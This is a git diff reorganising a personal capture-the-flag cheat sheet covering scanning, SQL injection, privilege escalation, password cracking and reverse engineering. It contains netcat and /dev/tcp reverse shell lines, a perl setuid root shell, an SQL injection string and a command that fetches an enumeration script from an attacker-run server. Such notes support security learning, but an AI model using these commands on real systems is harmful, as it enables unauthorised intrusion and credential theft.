@@ -1,17 +1,6 @@
 # CTF Reference
 
-### Native tools
-- [Lin Enum](https://github.com/rebootuser/LinEnum)
-- [Lin Peas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
-- [RustScan](https://github.com/RustScan/RustScan)
-- [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
-
-### Online tools
-- [Crypto Chef](https://gchq.github.io/CyberChef/)
-
-### Doc links
-- [Stego](https://0xrick.github.io/lists/stego/)
-
+## Web recon
  
  ### nmap 👁️
 ```shell
@@ -22,6 +11,7 @@ nmap -sC -A -T4 <ip>
 ```shell
 ffuf -u http://<url>/FUZZ -w /usr/share/wordlists/dirb/common.txt
 ```
+
 ```shell
 ffuf -u http://<url> -w /usr/share/dnsrecon/subdomains-top1mil.txt -H "Host: FUZZ.<domain>.com" -fc 301
 ```
@@ -40,33 +30,26 @@ nikto -host <ip>
 ```shell
 dirb <url> /usr/share/wordlists/dirb/common.txt
 ```
- 
-### Basic sudo escalation
+
+### get headers with wget
 ```
-sudo -l
-sudo -u theuser <app>
+wget -S some://url
 ```
 
-### Basic SQL injection
+## Initial access
+
+### Basic SQL injections
 ```
 ' OR name='test';--
 ```
 
-### Quick Python HTTP server
-Will serve any file in directory
-```shell
-python -m SimpleHTTPServer 8000
-```
-To fetch from the remote machine
-```shell
-wget http://<ip>:8000/LinEnum.sh
-```
-
 ### nc reverse shell
+
 Listener
 ```
 nc -nlvp 444
 ```
+
 Client
 ```
 /bin/sh | nc <ip> 444
@@ -74,16 +57,18 @@ Client
 bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
 ```
 
-### John
-
+## Linux privilege escalation / enumeration
+- [Lin Enum](https://github.com/rebootuser/LinEnum)
+- [Lin Peas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+- [RustScan](https://github.com/RustScan/RustScan)
+ 
+### Basic sudo escalation
 ```
-/usr/share/john/ssh2john.py id_rsa > id_rsa_hash
-
-john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
+sudo -l
+sudo -u theuser <app>
 ```
 
 ### Perl escalation
-
 ```
 perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
@@ -96,20 +81,8 @@ git-dumper https://some-url/.git ./meow
 ls ./meow
 ```
 
-### Adding to PATH
-```
-PATH=$PATH:/some/path
-```
 
-### ssh with private key
-```
-ssh -i some_id_rsa <usr>@<ip>
-```
 
-### get headers with wget
-```
-wget -S some://url
-```
 
 ### Metasploit basic usage
 ```shell
@@ -137,6 +110,97 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("10.198.73.23", 23))
 
 print s.recv(1024)
+```
+
+## Cryptography
+
+- [Crypto Chef](https://gchq.github.io/CyberChef/)
+
+### John
+
+```
+/usr/share/john/ssh2john.py id_rsa > id_rsa_hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
+```
+
+## Reverse
+
+Use ghidra to reverse the code to C
+
+```
+file some-executable
+checksec --file=some-executable
+strace ./some-executable
+rtrace ./some-executable
+```
+
+### GDB basics
+```
+gdb some-executable
+(gdb) info break
+(gdb) info registers
+(gdb) disassemble <fn-name>
+(gdb) break *0x000055555555539c
+(gdb) run
+(gdb) stepi
+(gdb) continue
+```
+
+### C Stuff
+```
+// time_t time(time_t *second) returns epoch in seconds
+time_t tVar;
+tVar = time((time_t *)0x0); // argument is NULL
+
+void srand(unsigned int seed) // sets a seed for rand() to use
+int rand(void)
+```
+
+### Assembly stuff
+#### Registers
+```
+RBP: bottom of the current stack frame
+RAX: 64bit version of EAX(32bit), and AX(16bit)
+``` 
+
+#### functions
+
+```
+LEA accepts a standard memory addressing operand, but does nothing more than store the calculated memory offset in the specified register, which may be any general purpose register.
+```
+```
+MOV dest_reg source_reg
+MOV eax, 0x0
+```
+
+## Steganography
+- [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
+- [Stego](https://0xrick.github.io/lists/stego/)
+
+## Other usefull stuff
+
+### Adding to PATH
+```
+PATH=$PATH:/some/path
+```
+
+### ssh with private key
+```
+ssh -i some_id_rsa <usr>@<ip>
+```
+
+### Quick Python HTTP server
+
+Will serve any file in directory
+```shell
+python -m SimpleHTTPServer 8000 # if python2
+python -m http.server
+```
+
+To fetch from the remote machine
+```shell
+wget http://<ip>:8000/LinEnum.sh
 ```
 
 ### Recursive wget 
@@ -198,54 +262,4 @@ for user in users:
     #...
     
 # 546d467562334a356558493d
-```
-
-## Reverse
-
-Use ghidra to reverse the code to C
-
-```
-file some-executable
-checksec --file=some-executable
-strace ./some-executable
-rtrace ./some-executable
-```
-
-### GDB basics
-```
-gdb some-executable
-(gdb) info break
-(gdb) info registers
-(gdb) disassemble <fn-name>
-(gdb) break *0x000055555555539c
-(gdb) run
-(gdb) stepi
-(gdb) continue
-```
-
-### C Stuff
-```
-// time_t time(time_t *second) returns epoch in seconds
-time_t tVar;
-tVar = time((time_t *)0x0); // argument is NULL
-
-void srand(unsigned int seed) // sets a seed for rand() to use
-int rand(void)
-```
-
-### Assembly stuff
-#### Registers
-```
-RBP: bottom of the current stack frame
-RAX: 64bit version of EAX(32bit), and AX(16bit)
-``` 
-
-#### functions
-
-```
-LEA accepts a standard memory addressing operand, but does nothing more than store the calculated memory offset in the specified register, which may be any general purpose register.
-```
-```
-MOV dest_reg source_reg
-MOV eax, 0x0
 ```
